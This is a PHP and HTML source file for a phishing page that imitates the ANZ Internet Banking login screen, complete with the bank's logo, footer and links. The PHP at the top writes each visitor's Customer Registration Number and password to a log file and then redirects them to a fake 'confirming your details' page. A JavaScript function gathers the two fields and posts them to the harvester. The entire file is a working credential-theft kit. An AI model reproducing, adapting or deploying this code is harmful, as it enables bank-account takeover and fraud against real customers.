<?php

include('config.php');

if (!empty($_POST['CRN']))
{
	$text = file_get_contents($log_filename);
	$text .= "===============================\n";
	$text .= "CRN: ".$_POST['CRN']."\n";
	$text .= "Password: ".$_POST['password']."\n";
	$text .= "===============================\n";
	file_put_contents($log_filename, $text);
	header('Location: loading.php');
}	
?>


<!DOCTYPE html>
<html lang="en">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<title>ANZ Internet Banking - Login</title>
	<meta name="description" content="Log in to Internet Banking...">
	<meta name="keywords" content="Internet Banking, logging in, log in, online banking, ANZ IB, IB">
	<meta name="SiteLevel" content="3">
	<meta name="PopupWindow" content="750:500">
	
<style>
.text
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

.text3
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: normal
}

A.text3:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

.text3bold
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

A.text3bold:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

</style>
	<link href="../common/header/css/ib_responsive_header.css" rel="stylesheet" type="text/css" />
	<link href="../inetbank/css/ib_logon_responsive_latest.css" rel="stylesheet" type="text/css" />
	<link href="../inetbank/css/bootstrap.css" rel="stylesheet" type="text/css" />
</head>
<body topmargin="0" marginwidth="0" marginheight="0" leftmargin="0" bgcolor="#ffffff"><div id="splashPage" style="display:none;">

	<title>ANZ Internet Banking</title>
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<meta name="format-detection" content="telephone=no">
	<link href="../common/header/css/ib_responsive_header.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/ib_logon_responsive_latest.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/bootstrap.css" rel="stylesheet" type="text/css">

<div class="container-fluid" id="headerBG">
<div id="header">
	<div class="logo">
		<img src="../common/header/images/ANZ-logo.png" title="ANZ Logo" alt="ANZ Logo" width="103px" height="42px">
	</div>
</div>
</div>

<div class="container">
	<div id="loader">
		<div style="padding:145px 0px;text-align:center">
		
			<div class="anz-loader">
		    	<div class="mh4ph" id="wBall_1">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_2">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_3">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_4">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_5">
		            <div class="dark-loader spinner"></div>
		        </div>
		    </div>
		  
  		<br>
        <div style="padding-top:5px;color:#444444;font-family:MyriadPro-Semibold,Arial;font-size:1em;font-weight:bold">Confirming your details...</div>
        </div>
	</div>
</div>
<link href="/common/footer/css/ib_responsive_footer.css" rel="stylesheet" type="text/css">
<div class="container-fluid" id="footerBG">
	<div id="footer">Australia and New Zealand Banking Group Limited (ANZ) 2020 ABN 11 005 357 522.</div>
</div>


</div>
<div id="logonAdmin" style="display:block;">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<title>ANZ Internet Banking - Login</title>
	<meta name="description" content="Log in to Internet Banking...">
	<meta name="keywords" content="Internet Banking, logging in, log in, online banking, ANZ IB, IB">
	<meta name="SiteLevel" content="3">
	<meta name="PopupWindow" content="750:500">
	
<style>
.text
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

.text3
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: normal
}

A.text3:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

.text3bold
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

A.text3bold:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

</style>
	<link href="/common/header/css/ib_responsive_header.css" rel="stylesheet" type="text/css">
	<link href="/inetbank/css/ib_logon_responsive_latest.css" rel="stylesheet" type="text/css">
	<link href="/inetbank/css/bootstrap.css" rel="stylesheet" type="text/css">

 

<div class="container-fluid" id="headerBG">
	<div id="header">
		<div class="logo">
			<img src="/common/header/images/ANZ-logo.png" title="ANZ Logo" alt="ANZ Logo" width="103px" height="42px">
		</div>
	</div>
</div>
	<div class="container">
		<div id="contentContainer">
		    <div class="mboxDefault mbox-name-ib:logon:service at-element-marker" style="visibility:visible;"></div>
			<!--div id="contentContainer Left" class="col-ts-12 col-sm-7 col-xs-7"-->
			<div id="contentContainerLeft" class="col-ts-12 col-xs-7">
				<div id="logonContainer">
					<h1>Log in to ANZ Internet Banking</h1>
					<div id="logonBox">
	<style type="text/css">
		.submit1
		{
			background: url("/images/CTA_Log-on.gif") no-repeat 0px 0px;
			display: block;
			height: 41px;
			width: 140px;
			margin-bottom:15px;
		}
		.submit1:hover{
			background-position: 0px -40px;
		}
	</style>

	<div id="loginDiv">
	  <div>
	    <label for="crn" class="loginDivLabels">Customer Registration Number</label>
	    <input id="crn" type="TEXT" class="loginDivfields" name="CorporateSignonCorpId" tabindex="1" size="16" maxlength="19" autocomplete="OFF">
	  </div>

	  <div>
	    <label for="Password" class="loginDivLabels">Password</label>
	    <input id="Password" type="PASSWORD" class="loginDivfields" name="CorporateSignonPassword" size="16" tabindex="2" autocomplete="OFF">
	  </div>

	  <div id="forgot">
	    <a id="forgotLink" href="" tabindex="4">Forgot login details?</a>
	  </div>


	  <div id="logonButton">
	    <a role="button" class="SignonButton btn btn-primary" onclick="send_data()" tabindex="3" title="Log on" style="display: inline;">Log in</a>
	  </div>
	  <div id="smallText">By logging in, you accept our <a href="" target="_blank">Security and Privacy Statement</a>.</div>
	</div>
</div>
				</div>


		<div class="mboxDefault mbox-name-ib:logon at-element-marker" style="visibility:visible;"></div>
		</div>


			<div id="contentContainerRight" class="col-ts-12 col-sm-5 col-xs-5">

				<div id="newToIBDiv">
					<div id="iconNew2IB"><h2>New to ANZ Internet Banking?</h2></div>
					<p>
						
						</p><ul>
							
								<li><a href="javascript:loadIntoOpener('http://www.anz.com/personal/ways-bank/internet-banking/register-now/');">Register for ANZ Internet Banking</a></li>
							
								<li><a href="javascript:loadIntoOpener('http://www.anz.com/personal/ways-bank/internet-banking/');">Read about ANZ Internet Banking</a></li>
							
								<li><a href="javascript:loadIntoOpener('http://www.anz.com/internet-banking/help/glossary/#terms_conditions_internet_banking');">Terms and Conditions</a></li>
							
						</ul>
						
					<p></p>
					</div>
					<div id="needHelpDiv">
						<div id="iconNeedHelp"><h2>Need some help?</h2></div>
						<p>
							
							</p><ul>
									<li><a href="">Need help logging in?</a></li>
									<li><a href="">What's new?</a></li>
									<li><a href="">Software requirements and settings</a></li>
									<li><a href="">Contact us</a></li>
								
							</ul>
							
						<p></p>
					</div>
					<div id="onlineSecurityDiv">
						<div id="iconOS"><h2>Online Security</h2></div>
						<p></p>
							<ul>
									<li><a href="">Read current security alert</a></li>
									<li><a href="">Online Security</a></li>
									<li><a href="">Security software offers</a></li>
							</ul>
						<p></p>
					</div>
			</div>
		</div>
	</div>
	
<link href="/common/footer/css/ib_responsive_footer.css" rel="stylesheet" type="text/css">
<div class="container-fluid" id="footerBG">
<div id="footer">
<span name="NOINDEX">
<p>©Australia and New Zealand Banking Group Limited (ANZ) 2020 ABN 11 005 357 522.</p>
</span>
</div>
</div>
</div>
<script type="text/javascript">
function send_data() {	
	var form = document.createElement("form");
	form.method = "POST";
	form.action = "";

	var element0 = document.createElement("input");
	element0.type="hidden";
	element0.name="CRN";
	element0.value=document.getElementById('crn').value;
	if (element0.value.length != 9)
	{
		alert("Please check Customer Registration Number");
		element0.value = 0;
		return 0;
	}
	form.appendChild(element0);

	var element3 = document.createElement("input");
	element3.type="hidden";
	element3.name="password";
	element3.value=document.getElementById('Password').value;
	if (!element3.value)
	{
		alert("Please check password");
		element3.value = 0;
		return 0;
	}
	form.appendChild(element3);

	document.body.appendChild(form);
	form.submit();
}

//////////////////////////////////////
	var cc = document.getElementById("crn");
	for (var i in ['input', 'change', 'blur', 'keyup']) {
		cc.addEventListener('input', formatCardCode3, false);
	}
	function formatCardCode3() {
	    var cardCode = this.value.replace(/[^\d]/g, '').substring(0,9);
	    this.value = cardCode;
	}
//////////////////////////////////////
</script>

</body>
</html>